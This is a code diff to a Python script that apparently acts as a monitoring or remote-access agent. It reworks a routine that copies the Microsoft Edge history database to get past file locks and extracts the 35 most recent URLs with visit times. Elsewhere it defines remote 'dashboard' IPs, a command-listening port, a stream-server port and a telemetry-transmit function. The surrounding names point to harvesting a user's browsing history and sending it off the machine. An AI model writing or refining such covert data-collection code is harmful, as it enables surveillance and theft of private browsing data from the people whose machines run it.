@@ -32,7 +32,7 @@ except ImportError:
 
 ui_queue = queue.Queue()
 
-DASHBOARD_IPS = ["192.168.3.50", "172.65.21.45", "172.65.21.7", "172.65.21.90", "172.65.21.1", "172.65.21.6"]
+DASHBOARD_IPS = ["192.168.1.4", "172.65.21.45", "172.65.21.7", "172.65.21.90", "172.65.21.1", "172.65.21.6"]
 TELEMETRY_PORT = 5005
 LISTEN_COMMAND_PORT = 6006
 STREAM_SERVER_PORT = 7007      
@@ -135,26 +135,51 @@ def gather_pnp_hardware_assets():
 
 def gather_browsing_history():
     logs = []
-    if not os.path.exists(EDGE_HISTORY_FILE): return logs
+    # Explicit definition of the target layout file
+    if not os.path.exists(EDGE_HISTORY_FILE): 
+        return logs
+        
     temp_db = "edge_hist_temp.db"
     try:
+        # Create a clean isolated local copy to evade Edge engine runtime file locks
         shutil.copy2(EDGE_HISTORY_FILE, temp_db)
-        sqlite3.connect(temp_db)
+        
         conn = sqlite3.connect(temp_db)
         cursor = conn.cursor()
-        cursor.execute("SELECT url, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 35")
+        
+        # FIX: Directly use SQLite's native formatting engine to securely convert Webkit epoch 
+        # to a clean, universal string layout. This prevents Python processing exceptions.
+        query = """
+            SELECT 
+                url, 
+                datetime(last_visit_time / 1000000 + strftime('%s', '1601-01-01'), 'unixepoch', 'localtime') 
+            FROM urls 
+            WHERE last_visit_time > 0 
+            ORDER BY last_visit_time DESC 
+            LIMIT 35
+        """
+        cursor.execute(query)
+        
         for row in cursor.fetchall():
-            try: 
-                converted_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime((row[1] / 1000000) - 11644473600))
-            except: 
-                converted_time = "Recent Visit"
-            logs.append({"site": row[0], "ip": converted_time})
+            url_val = str(row[0]).strip()
+            time_val = str(row[1]) if row[1] else "Unknown Time"
+            
+            # Ensure safe output filtering for incomplete records
+            if url_val:
+                logs.append({
+                    "url": url_val, 
+                    "time": time_val
+                })
+                
         conn.close()
-    except: 
-        pass
+    except Exception as e:
+        # Standard sys stream reporting bypass to keep operations transparent 
+        print(f"[*] Browsing history routine warning block: {e}")
+        
     if os.path.exists(temp_db):
         try: os.remove(temp_db)
         except: pass
+        
     return logs
 
 def package_and_transmit_telemetry():
